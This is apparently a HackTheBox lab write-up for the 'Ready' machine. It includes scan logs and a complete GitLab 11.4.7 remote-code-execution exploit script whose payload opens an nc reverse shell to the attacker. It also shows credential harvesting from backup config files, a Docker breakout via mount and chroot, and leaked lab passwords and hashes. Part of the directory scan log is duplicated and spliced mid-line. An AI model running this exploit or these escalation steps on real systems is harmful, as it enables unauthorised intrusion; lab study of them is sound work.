# Before you read...

> In this writeup, I just take what is important and all of the steps and findings in text-based, which is there's no images here.

# NOTE >> 13/5/2021

![Ready](https://cdn.discordapp.com/attachments/828943698749554688/1027406727936749588/ready2.png)

# Solving Machine "Ready" in Hackthebox
```
1. User Flag
e1e30b052b6ec0670698805d745e7682

2. Root Flag
b7f98681505cd39066f67147b103c2b3
```
>> Before you read, you might want to open this note in Sublime Text for better display.

Let's begin.

Step by step :
# 1. Do nmap on target's IP Address
```
└─$ sudo nmap -O -A -sC -sV 10.10.10.220
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-12 22:35 EDT
Nmap scan report for 10.10.10.220
Host is up (0.25s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)	
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=5/12%OT=22%CT=1%CU=34076%PV=Y%DS=2%DC=T%G=Y%TM=609C90B
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   252.91 ms 10.10.14.1
2   253.30 ms 10.10.10.220

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.45 seconds
```

> -> SSH 	<open>
> -> HTTP <open> -> on port 5080
	So, we try to open website with port 5080 by specifying 'http://10.10.10.220:5080'


# 2. Try to find if there's any hidden directories on that IP Address (Directory Bruteforcing)

Command : python3 dirsearch.py http://10.10.10.220:5080
```
└─$ python3 dirsearch.py -u 10.10.10.220:5080

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10877

Output File: /home/kali/dirsearch/reports/10.10.10.220/_21-05-12_22-42-16.txt

Error Log: /home/kali/dirsearch/logs/errors-21-05-12_22-42-16.log

Target: http://10.10.10.220:5080/

[22:42:16] Starting: 
[22:42:21] 401 -   49B  - /!.htpasswd
[22:42:22] 401 -   49B  - /php.old       
[22:42:22] 401 -   49B  - /js.bak
[22:42:22] 401 -   49B  - /!.htaccess    
[22:42:22] 401 -   49B  - /aspx.old
[22:42:22] 401 -   49B  - /html.tar          
[22:42:22] 401 -   49B  - /jsp.bak
[22:42:22] 401 -   49B  - /php.bak
[22:42:22] 401 -   49B  - /html.old
[22:42:22] 401 -   49B  - /aspx.bak
[22:42:22] 401 -   49B  - /jsp.old
[22:42:22] 401 -   49B  - /php.tar
[22:42:22] 401 -   49B  - /jsp.tar
[22:42:22] 401 -   49B  - /js.old
[22:42:22] 401 -   49B  - /aspx.tar
[22:42:22] 401 -   49B  - /!.gitignore       
[22:42:22] 401 -   49B  - /html.bak         
[22:42:22] 401 -   49B  - /js.tar                
[22:42:22] 401 -   49B  - /aspx.tgz
[22:42:22] 401 -   49B  - /jsp.tgz
[22:42:22] 401 -   49B  - /html.tgz
[22:42:22] 401 -   49B  - /js.tgz
[22:42:22] 401 -   49B  - /php.txt
[22:42:22] 401 -   49B  - /aspx.txt
[22:42:22] 401 -   49B  - /html.txt
[22:42:22] 401 -   49B  - /jsp.txt
[22:42:22] 401 -   49B  - /js.txt
[22:42:22] 302 -  108B  - /php.zip  ->  http://10.10.10.220:5080/users/sign_in.zip
[22:42:22] 302 -  108B  - /aspx.zip  ->  http://10.10.10.220:5080/users/sign_in.zip
[22:42:22] 401 -   49B  - /..;/
[22:42:22] 302 -  108B  - /html.zip  ->  http://10.10.10.220:5080/users/sign_in.zip
[22:42:22] 302 -  108B  - /js.zip  ->  http://10.10.10.220:5080/users/sign_in.zip
[22:42:22] 302 -  108B  - /jsp.zip  ->  http://10.10.10.220:5080/users/sign_in.zip
[22:42:22] 401 -   49B  - /php.tgz
[22:42:22] 302 -  108B  - /.agilekeychain.zip  ->  http://10.10.10.220:5080/users/sign_in.zip                                           
[22:42:22] 401 -   61B  - /.angular-cli.json            
[22:42:23] 401 -   49B  - /.appveyor.ym
[22:42:23] 401 -  125B  - /.apport-ignore.xml       
[22:42:23] 401 -   49B  - /.atom/config.cson                     
[22:42:23] 401 -   49B  - /.azure-pipelines.yml 
[22:42:23] 401 -   61B  - /.azure/accessTokens.json
[22:42:23] 401 -   49B  - /.badarg.log
[22:42:23] 401 -   49B  - /.babelrc.cjs
[22:42:23] 401 -   61B  - /.babel.json          
[22:42:23] 401 -   62B  - /.bluemix/pipeline.yaml    
[22:42:23] 401 -   61B  - /.bower.json      
[22:42:23] 401 -   61B  - /.buildkite/pipeline.json
[22:42:23] 401 -   49B  - /.binstar.yml
[22:42:23] 401 -   49B  - /.bluemix/pipeline.yml
[22:42:23] 401 -   62B  - /.buildkite/pipeline.yaml
[22:42:24] 401 -   49B  - /.buildkite/pipeline.yml
[22:42:24] 401 -   49B  - /.bak_0.log
[22:42:24] 401 -   49B  - /.badsegment.log       
[22:42:24] 401 -   61B  - /.brackets.json
[22:42:24] 401 -   49B  - /.bumpversion.cfg         
[22:42:24] 401 -   49B  - /.c9/metadata/environment/.env
[22:42:24] 401 -   49B  - /.cc-ban.txt                   
[22:42:24] 401 -   49B  - /.chef/config.rb
[22:42:24] 401 -   49B  - /.circleci/circle.yml
[22:42:24] 401 -   49B  - /.cc-ban.txt.bak
[22:42:24] 401 -   49B  - /.circleci/config.yml
[22:42:24] 401 -   49B  - /.clog.toml               
[22:42:24] 401 -   49B  - /.codacy.yml          
[22:42:24] 401 -   49B  - /.chef/knife.rb
[22:42:24] 401 -   61B  - /.codeclimate.json
[22:42:25] 401 -   49B  - /.codecov.yml
[22:42:25] 401 -   49B  - /.codeclimate.yml
[22:42:25] 401 -   49B  - /.cocoadocs.yml
[22:42:25] 401 -   62B  - /.codeship.yaml      
[22:42:25] 401 -   49B  - /.codeship.yml              
[22:42:25] 401 -   49B  - /.codefresh/codefresh.yml 
[22:42:25] 401 -   61B  - /.config/gatsby/config.json
[22:42:25] 401 -   61B  - /.config/gatsby/events.json
[22:42:25] 401 -   49B  - /.config/gcloud/access_tokens.db
[22:43:03] 401 -   49B  - /.sql.bz2


[22:43:03] 401 -   49B  - /.sql.gz                  
[22:43:03] 401 -   49B  - /.ssh.asp                  
[22:43:04] 401 -   49B  - /.ssh/google_compute_engine.pub       
[22:43:04] 401 -   49B  - /.ssh/id_rsa.priv~
[22:43:04] 401 -   49B  - /.ssh/id_rsa.priv               
[22:43:04] 401 -   49B  - /.ssh/id_rsa.key
[22:43:04] 401 -   49B  - /.ssh/id_dsa.pub
[22:43:04] 401 -   49B  - /.ssh/id_rsa.key~      
[22:43:04] 401 -   49B  - /.ssh/id_rsa.pub~       
[22:43:05] 401 -   49B  - /.style.yapf
[22:43:05] 401 -   49B  - /.ssh/id_rsa.pub
[22:43:05] 401 -   49B  - /.ssh/identity.pub


[22:43:05] 401 -   49B  - /.stickler.yml             
[22:42:25] 401 -   49B  - /.config/gcloud/credentials.db
[22:42:22] 401 -   49B  - /html.txt
[22:42:22] 401 -   49B  - /jsp.txt
[22:42:22] 401 -   49B  - /js.txt
[22:42:22] 302 -  108B  - /php.zip  ->  http://10.10.10.220:5080/users/sign_in.zip
[22:42:22] 302 -  108B  - /aspx.zip  ->  http://10.10.10.220:5080/users/sign_in.zip
[22:43:12] 401 -   49B  - /.well-known/keybase.txt
[22:43:12] 401 -   49B  - /.well-known/security.txt     
[22:43:12] 200 -  797B  - /.well-known/openid-configuration
[22:43:12] 400 -    0B  - /.well-known/webfinger                 
[22:43:12] 401 -   49B  - /.wp-config.php.swp             
[22:43:12] 401 -   49B  - /.zcompdump-remote-deskto
[22:43:18] 401 -   49B  - /2011.tgz          
[22:43:18] 401 -   49B  - /2011.tar
[22:43:18] 401 -   49B  - /2011.tar.gz        
[22:43:18] 302 -  108B  - /2010.zip  ->  http://10.10.10.220:5080/users/sign_in.zip
[22:43:18] 401 -   49B  - /2011.tar.bz2
[22:43:18] 401 -   49B  - /2010.sql
[22:43:18] 401 -   49B  - /2010.tar.gz
[22:43:18] 401 -   49B  - /2012.tar
[22:43:18] 401 -   49B  - /2012.tar.bz2   
[22:43:19] 401 -   49B  - /2012.tgz       
[22:43:19] 302 -  108B  - /2011.zip  ->  http://10.10.10.220:5080/users/sign_in.zip
[22:43:19] 401 -   49B  - /2014.tgz
[22:43:19] 401 -   49B  - /2012.tar.gz
[22:43:19] 302 -  108B  - /2014.zip  ->  http://10.10.10.220:5080/users/sign_in.zip
[22:43:19] 302 -  108B  - /2012.zip  ->  http://10.10.10.220:5080/users/sign_in.zip
[22:43:19] 401 -   49B  - /2014.tar.gz
[22:43:19] 401 -   49B  - /2015.sql
[22:43:19] 401 -   49B  - /2012.sql
[22:43:19] 401 -   49B  - /2013.tar
[22:43:19] 401 -   49B  - /2014.tar
[22:43:19] 401 -   49B  - /2013.tar.gz
[22:43:19] 401 -   49B  - /2013.tgz
[22:43:19] 401 -   49B  - /2013.sql
[22:43:19] 401 -   49B  - /2015.tar.bz2
[22:43:19] 401 -   49B  - /2013.tar.bz2
[22:43:19] 401 -   49B  - /2014.tar.bz2
[22:43:19] 401 -   49B  - /2015.tar       
[22:43:19] 302 -  108B  - /2013.zip  ->  http://10.10.10.220:5080/users/sign_in.zip
[22:43:20] 401 -   49B  - /2019.tar
[22:43:20] 401 -   49B  - /2017.sql       
[22:43:20] 302 -  108B  - /2016.zip  ->  http://10.10.10.220:5080/users/sign_in.zip
[22:43:20] 302 -  108B  - /2015.zip  ->  http://10.10.10.220:5080/users/sign_in.zip
[22:43:20] 401 -   49B  - /2018.tar.bz2
[22:43:21] 401 -   49B  - /2019.tar.gz
[22:43:21] 401 -   49B  - /2019.sql
[22:43:21] 401 -   49B  - /2017.tgz
[22:43:21] 401 -   49B  - /2018.sql
[22:43:21] 401 -   49B  - /2018.tgz
[22:43:21] 401 -   49B  - /2020.tgz
[22:43:21] 401 -   49B  - /2020.sql
[22:43:21] 302 -  108B  - /2017.zip  ->  http://10.10.10.220:5080/users/sign_in.zip
[22:43:21] 401 -   49B  - /2020.tar
[22:43:21] 302 -  108B  - /2020.zip  ->  http://10.10.10.220:5080/users/sign_in.zip
[22:43:21] 401 -   49B  - /2018.tar
[22:43:21] 401 -   49B  - /2019.tgz
[22:43:21] 401 -   49B  - /2020.tar.bz2
[22:43:21] 302 -  108B  - /2018.zip  ->  http://10.10.10.220:5080/users/sign_in.zip
[22:43:21] 302 -  108B  - /2019.zip  ->  http://10.10.10.220:5080/use[22:43:03] 401 -   49B  - /.sql.bz2
[22:43:03] 401 -   49B  - /.sql.gz                  
[22:43:03] 401 -   49B  - /.ssh.asp                  
[22:43:04] 401 -   49B  - /.ssh/google_compute_engine.pub       
[22:43:04] 401 -   49B  - /.ssh/id_rsa.priv~
[22:43:04] 401 -   49B  - /.ssh/id_rsa.priv               
[22:43:04] 401 -   49B  - /.ssh/id_rsa.key
[22:43:04] 401 -   49B  - /.ssh/id_dsa.pub
[22:43:04] 401 -   49B  - /.ssh/id_rsa.key~      
[22:43:04] 401 -   49B  - /.ssh/id_rsa.pub~       
[22:43:05] 401 -   49B  - /.style.yapf
[22:43:05] 401 -   49B  - /.ssh/id_rsa.pub
[22:43:05] 401 -   49B  - /.ssh/identity.pub
[22:43:05] 401 -   49B  - /.stickler.yml             
rs/sign_in.zip
[22:43:21] 401 -   49B  - /2019.tar.bz2   
[22:43:21] 401 -   49B  - /2016.sql
[22:43:21] 401 -   49B  - /2020.tar.gz    
[22:43:22] 404 -    3KB - /404.html        
[22:43:27] 401 -   49B  - /AT-admin.cgi                                           
[22:43:27] 401 -   49B  - /ASPSamp/AdvWorks/equipment/catalog_type.asp
[22:43:27] 401 -   49B  - /Admin/knowledge/dsmgr/users/GroupManager.asp      
[22:47:16] 401 -   49B  - /home.tar           
[22:47:16] 401 -   49B  - /history.txt
[22:47:16] 200 -   37KB - /help.htm               
[22:47:16] 401 -   49B  - /home.tar.bz2
[22:47:16] 401 -   49B  - /home.rar           
[22:47:16] 200 -   37KB - /help/
[22:47:16] 401 -   49B  - /history.md       
[22:47:17] 401 -   49B  - /htaccess.backup             
[22:47:17] 401 -   49B  - /htaccess.txt
[22:47:17] 302 -  108B  - /home.zip  ->  http://10.10.10.220:5080/users/sign_in.zip
[22:47:17] 401 -   49B  - /htaccess.bak             
[22:47:17] 401 -   49B  - /hs_err_pid.log
[22:47:17] 401 -   49B  - /houtai/admin.asp
[22:47:17] 401 -   49B  - /htaccess.dist
[22:47:17] 200 -   37KB - /help
[22:47:17] 401 -   49B  - /htaccess.old        
[22:47:18] 401 -   49B  - /html.tar.bz2    
[22:50:17] 200 -   13KB - /public                   
[22:50:18] 401 -   49B  - /public_html/robots.txt  
[22:50:18] 200 -   13KB - /public/
[22:50:31] 401 -   49B  - /robot.txt             
[22:50:31] 200 -    2KB - /robots.txt         
[22:50:31] 401 -   49B  - /robots.txt.dist
[22:50:32] 200 -   15KB - /root                          
[22:50:32] 200 -   15KB - /root/                
[22:50:33] 401 -   49B  - /run.sh                  
[22:50:33] 401 -   49B  - /sales.csv                      
[22:50:33] 401 -   49B  - /sales.lo
[22:50:39] 200 -   12KB - /search                    
[22:50:39] 200 -   12KB - /search.jsp         
[22:50:39] 200 -   12KB - /search.html
[22:50:39] 200 -   12KB - /search.aspx
[22:50:40] 200 -   12KB - /search.php                       
[22:50:40] 200 -    3KB - /search.js
[22:51:56] 200 -   15KB - /test
```


> Found this one on "/.well-known/openid-configuration"
```
issuer	"http://172.19.0.2"
authorization_endpoint	"https://10.10.10.220:5080/oauth/authorize"
token_endpoint	"https://10.10.10.220:5080/oauth/token"
userinfo_endpoint	"https://10.10.10.220:5080/oauth/userinfo"
jwks_uri	"https://10.10.10.220:5080/oauth/discovery/keys"
scopes_supported	
0	"api"
1	"read_user"
2	"sudo"
3	"read_repository"
4	"openid"
response_types_supported	
0	"code"
1	"token"
response_modes_supported	
0	"query"
1	"fragment"
token_endpoint_auth_methods_supported	
0	"client_secret_basic"
1	"client_secret_post"
subject_types_supported	
0	"public"
id_token_signing_alg_values_supported	
0	"RS256"
claim_types_supported	
0	"normal"
claims_supported	
0	"iss"
1	"sub"
2	"aud"
3	"exp"
4	"iat"
5	"sub_legacy"
6	"name"
7	"nickname"
8	"email"
9	"email_verified"
10	"website"
11	"profile"
12	"picture"
13	"groups"
```

> Found this one too on robots.txt
```
# See http://www.robotstxt.org/robotstxt.html for documentation on how to use the robots.txt file
#
# To ban all spiders from the entire site uncomment the next two lines:
# User-Agent: *
# Disallow: /

# Add a 1 second delay between successive requests to the same server, limits resources used by crawler
# Only some crawlers respect this setting, e.g. Googlebot does not
# Crawl-delay: 1

# Based on details in https://gitlab.com/gitlab-org/gitlab-ce/blob/master/config/routes.rb, https://gitlab.com/gitlab-org/gitlab-ce/blob/master/spec/routing, and using application
User-Agent: *
Disallow: /autocomplete/users
Disallow: /search
Disallow: /api
Disallow: /admin
Disallow: /profile
Disallow: /dashboard
Disallow: /projects/new
Disallow: /groups/new
Disallow: /groups/*/edit
Disallow: /users
Disallow: /help
# Only specifically allow the Sign In page to avoid very ugly search results
Allow: /users/sign_in

# Global snippets
User-Agent: *
Disallow: /s/
Disallow: /snippets/new
Disallow: /snippets/*/edit
Disallow: /snippets/*/raw

# Project details
User-Agent: *
Disallow: /*/*.git
Disallow: /*/*/fork/new
Disallow: /*/*/repository/archive*
Disallow: /*/*/activity
Disallow: /*/*/new
Disallow: /*/*/edit
Disallow: /*/*/raw
Disallow: /*/*/blame
Disallow: /*/*/commits/*/*
Disallow: /*/*/commit/*.patch
Disallow: /*/*/commit/*.diff
Disallow: /*/*/compare
Disallow: /*/*/branches/new
Disallow: /*/*/tags/new
Disallow: /*/*/network
Disallow: /*/*/graphs
Disallow: /*/*/milestones/new
Disallow: /*/*/milestones/*/edit
Disallow: /*/*/issues/new
Disallow: /*/*/issues/*/edit
Disallow: /*/*/merge_requests/new
Disallow: /*/*/merge_requests/*.patch
Disallow: /*/*/merge_requests/*.diff
Disallow: /*/*/merge_requests/*/edit
Disallow: /*/*/merge_requests/*/diffs
Disallow: /*/*/project_members/import
Disallow: /*/*/labels/new
Disallow: /*/*/labels/*/edit
Disallow: /*/*/wikis/*/edit
Disallow: /*/*/snippets/new
Disallow: /*/*/snippets/*/edit
Disallow: /*/*/snippets/*/raw
Disallow: /*/*/deploy_keys
Disallow: /*/*/hooks
Disallow: /*/*/services
Disallow: /*/*/protected_branches
Disallow: /*/*/uploads/
```

Nothing interesting on the website apparently
so next thing to do is to...
-> check the gitlab version -> 11.4.7

and then
because it has been approved that gitlab 11.4.7 has a RCE, we can do reverse shell :D

> this is the following script:
```
# Exploit Title: GitLab 11.4.7 RCE (POC)
# Date: 24th December 2020
# Exploit Author: Norbert Hofmann
# Exploit Modifications: Sam Redmond, Tam Lai Yin
# Original Author: Mohin Paramasivam
# Software Link: https://gitlab.com/
# Environment: GitLab 11.4.7, community edition
# CVE: CVE-2018-19571 + CVE-2018-19585

#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
import argparse
import random


parser = argparse.ArgumentParser(description='GitLab 11.4.7 RCE')
parser.add_argument('-u', help='GitLab Username/Email', required=True)
parser.add_argument('-p', help='Gitlab Password', required=True)
parser.add_argument('-g', help='Gitlab URL (without port)', required=True)
parser.add_argument('-l', help='reverse shell ip', required=True)
parser.add_argument('-P', help='reverse shell port', required=True)
args = parser.parse_args()

username = args.u
password = args.p
gitlab_url = args.g + ":5080"
local_ip = args.l
local_port = args.P

session = requests.Session()

# Get Authentication Token
r = session.get(gitlab_url + "/users/sign_in")
soup = BeautifulSoup(r.text, features="lxml")
token = soup.findAll('meta')[16].get("content")
print(f"[+] authenticity_token: {token}")

login_form = {
    "authenticity_token": token,
    "user[login]": username,
    "user[password]": password,
    "user[remember_me]": "0"
}
r = session.post(f"{gitlab_url}/users/sign_in", data=login_form)

if r.status_code != 200:
    exit(f"Login Failed:{r.text}")

# Create project
import_url = "git%3A%2F%2F%5B0%3A0%3A0%3A0%3A0%3Affff%3A127.0.0.1%5D%3A6379%2Ftest%2F.git"
project_name = f'project{random.randrange(1, 10000)}'
project_url = f'{gitlab_url}/{username}'

print(f"[+] Creating project with random name: {project_name}")

form = """\nmulti
    sadd resque:gitlab:queues system_hook_push
    lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|""" + f'nc {local_ip} {local_port} -e /bin/bash' + """ \\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1608799993.1234567,\\"enqueued_at\\":1608799993.1234567}"
    exec
    exec
    exec\n"""

r = session.get(f"{gitlab_url}/projects/new")
soup = BeautifulSoup(r.text, features="lxml")

namespace_id = soup.find(
    'input', {'name': 'project[namespace_id]'}).get('value')

project_token = soup.findAll('meta')[16].get("content")
project_token = project_token.replace("==", "%3D%3D")
project_token = project_token.replace("+", "%2B")

payload = f"utf8=%E2%9C%93&authenticity_token={project_token}&project%5Bimport_url%5D={import_url}{form}&project%5Bci_cd_only%5D=false&project%5Bname%5D={project_name}&project%5Bnamespace_id%5D={namespace_id}&project%5Bpath%5D={project_name}&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0"

cookies = {
    'sidebar_collapsed': 'false',
    'event_filter': 'all',
    'hide_auto_devops_implicitly_enabled_banner_1': 'false',
    '_gitlab_session': session.cookies['_gitlab_session'],
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': f'{gitlab_url}/projects',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '398',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
}

print("[+] Running Exploit")
r = session.post(
    gitlab_url+'/projects', data=payload, cookies=cookies, headers=headers, verify=False)
if "The change you requested was rejected." in r.text:
    exit('Exploit failed, check input params')

print('[+] Exploit completed successfully!')
```

# 3. Set a listener and execute the script to get a reverse shell
```
command : "python3 gitlab_11.4.7_rce_exploit.py -u aseng123@gmail.com -p 12345678 -g http://10.10.10.220 -l 10.10.14.40 -P 9999"

result : 
[+] authenticity_token: uW396SWSnH+4NHxWisUlAbyO/HjF3XgBcxzufeSyGAv/DAFTdUG/uubbBYTw3k1VZ72GeIPqt2buB4gIp0Ep4A==
[+] Creating project with random name: project1374
[+] Running Exploit
[+] Exploit completed successfully!
```

# 4. Get the User flag

get to the /home/dude directory and get the user flag
 
> user flag = e1e30b052b6ec0670698805d745e7682



# 5. Now, find a way to PrivEsc

ls -lsa
total 104
4 drwxr-xr-x   1 root root 4096 Dec  1 12:41 .
4 drwxr-xr-x   1 root root 4096 Dec  1 12:41 ..
0 -rwxr-xr-x   1 root root    0 Dec  1 12:41 .dockerenv
4 -rw-r--r--   1 root root  185 Nov 20  2018 RELEASE
4 drwxr-xr-x   2 root root 4096 Nov 20  2018 assets
4 drwxr-xr-x   1 root root 4096 Dec  1 15:40 bin
4 drwxr-xr-x   2 root root 4096 Apr 12  2016 boot
0 drwxr-xr-x  13 root root 3760 May 13 13:36 dev
8 drwxr-xr-x   1 root root 4096 Dec  2 10:45 etc
4 drwxr-xr-x   1 root root 4096 Dec  2 10:45 home
4 drwxr-xr-x   1 root root 4096 Sep 13  2015 lib
4 drwxr-xr-x   2 root root 4096 Nov 13  2018 lib64
4 drwxr-xr-x   2 root root 4096 Nov 13  2018 media
4 drwxr-xr-x   2 root root 4096 Nov 13  2018 mnt
8 drwxr-xr-x   1 root root 4096 Dec  1 16:23 opt
0 dr-xr-xr-x 387 root root    0 May 13 13:36 proc
4 drwx------   1 root root 4096 Dec 13 15:06 root
4 -rw-r--r--   1 root root   23 Jun 29  2020 root_pass
8 drwxr-xr-x   1 root root 4096 Dec 13 15:07 run
4 drwxr-xr-x   1 root root 4096 Nov 19  2018 sbin
4 drwxr-xr-x   2 root root 4096 Nov 13  2018 srv
0 dr-xr-xr-x  13 root root    0 May 13 13:36 sys
4 drwxrwxrwt   1 root root 4096 May 13 23:05 tmp
8 drwxr-xr-x   1 root root 4096 Nov 13  2018 usr
8 drwxr-xr-x   1 root root 4096 Nov 13  2018 var

====  First attempt = sudo -l
> nothing interesting

====  Second Attempt = find some information
> 1. Got a root_pass : YG65407Bjqvv9A0a8Tm_7w

> 2. Got its rsa key pub : (still not sure :/)
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDP7QIBC5uLf1XUGiCSpM47vuXYQ0cgrAGDKGYYb2565zCfO+kuKbcDpY+0HohEiiU5qUkKm4V6ZTN/4btq4mOlczzRGgvCJ4EB5krFrTQ3i2DobD3zacZTgUWzDmG7R5kcUImhlaYZkiHDAzanfmCNlB3IiCgGM2B+VTsmeDwuzZI3zqZulszO6tuE/DGM+lXssuzn3P76ep5d3cdesam25/IVKB8/4/uPOBeFXGAS5FG/MeNaNWD8MOPwUNUgVa22g3GGsgyJ8IJYSYgONSqb8uv15ykIbW0N6KLkH+x1IRthnrpTdi8niuafRxie3zjj0g8mtefm6h2g5yMu70Od root@2d5bd3a6800e

==== Third Attempt = More of searching
> Interesting Directory as usual...
-> tmp
-> opt

check for the opt one :
> there's backup dir
cd /opt/backup

and then start enumerating something..
>> cat ./* | grep "passw"

```
        gitlab_rails['initial_root_password']=File.read('/root_pass')
#### Email account password
# gitlab_rails['incoming_email_password'] = "[REDACTED]"
#     password: '_the_password_of_the_bind_user'
#     password: '_the_password_of_the_bind_user'
#   '/users/password',
#### Change the initial default admin password and shared runner registration tokens.
# gitlab_rails['initial_root_password'] = "password"
# gitlab_rails['db_password'] = nil
# gitlab_rails['redis_password'] = nil
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
# gitlab_shell['http_settings'] = { user: 'username', password: 'password', ca_file: '/etc/ssl/cert.pem', ca_path: '/etc/pki/tls/certs', self_signed_cert: false}
##! `SQL_USER_PASSWORD_HASH` can be generated using the command `gitlab-ctl pg-password-md5 gitlab`
# postgresql['sql_user_password'] = 'SQL_USER_PASSWORD_HASH'
# postgresql['sql_replication_password'] = "md5 hash of postgresql password" # You can generate with `gitlab-ctl pg-password-md5 <dbuser>`
# redis['password'] = 'redis-password-goes-here'
####! **Master password should have the same value defined in
####!   redis['password'] to enable the instance to transition to/from
# redis['master_password'] = 'redis-password-goes-here'
# geo_secondary['db_password'] = nil
# geo_postgresql['pgbouncer_user_password'] = nil
#     password: PASSWORD
###! generate this with `echo -n '$password + $username' | md5sum`
# pgbouncer['auth_query'] = 'SELECT username, password FROM public.pg_shadow_lookup($1)'
#     password: MD5_PASSWORD_HASH
# postgresql['pgbouncer_user_password'] = nil
```
There's gitlab_rails smtp passwod = wW59U!ZKMbG9+*#h


I try to use the Gitlab_rails smtp password to > su root

and it works !!


root@gitlab:/

# Found another interesting things :
> socket.0
> socket.1

>> which is for docker instance (maybe...)

# Now what should i do is to...breakout from current docker container
How to know if i am inside the container?
## do "ls -l" command and if there's any ".dockerenv" on the list, that's the prove if i im in a docker container



6. Now, to breakout from a container

>> There are several things to enumarate system in UNIX/Linux, 
but in this such case...to enumerate information that's needed to breakout from a container


# Note...
```
1. fdisk -l
"The --privileged flag allows the container to have access to the host devices. 
When we run a container without the flag, we can run fdisk -l and see that nothing is there."

2. Mount the linux_file_system and bring it to the directory that you've just made
Ok, so we can see it but we want to control it. We can work towards that by first mounting the drive with two commands:

> mkdir /mnt/<add a directory>
> mount /dev/<which sda holds the "linux filesystem"> /mnt/<add a directory>/

---- for example :
> mkdir /mnt/host
> mount /dev/sda1 /mnt/host/
```
  
As you can see, we now have access to the host filesystem where we can see the victim users home directory.
But again, we want to be able to run commands on the host. 
So to start, we should check out the container's /bin/ directory

However, there is one command staring right at us that makes this whole thing trivial: chroot. We just need to run the below command and we have full system access!

# 3. Get access as a real root user
```
> chroot /mnt/host/
root@gitlab:~#
```
  
# 4. Get the root flag
```
> root@gitlab:~# cat root.txt
> cat root.txt
> b7f98681505cd39066f67147b103c2b3
```
## ---- Done ----

user dude's hash from /etc/shadow :
> cat /etc/shadow
```
dude:$6$CspweLQq29lopA9a$tbyLbtD6CSjNMv2jSEaJ9xRQFBl.C26cLu6HtuofggWqlZZHWUQ7LD8dta.D/CvFZYGT2TSvk90i6YYWdbIm5/:18450:0:99999:7:::
```
# Source to learn :
https://bestestredteam.com/2019/09/17/container-breakout/
https://systemadminspro.com/docker-container-breakout/
https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#cap_sys_admin

# Proof of Completion :
https://www.hackthebox.eu/achievement/machine/429928/304


